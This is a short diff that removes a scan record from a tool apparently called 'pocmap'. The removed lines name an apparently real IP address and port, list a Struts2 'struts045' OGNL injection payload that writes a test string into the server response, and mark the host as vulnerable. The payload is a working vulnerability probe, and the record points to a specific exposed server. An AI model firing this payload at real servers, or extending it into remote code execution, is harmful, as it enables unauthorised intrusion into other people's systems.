@@ -1,6 +1,1 @@
 ======================= pocmap v1.0 =======================
-URL: http://27.223.70.16:311/
-type: struts045 Vul
-payload: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('test'+602+53718)).(#o.close())}
-result: http://27.223.70.16:311/struts045 Vul
------------------------------------------------------------
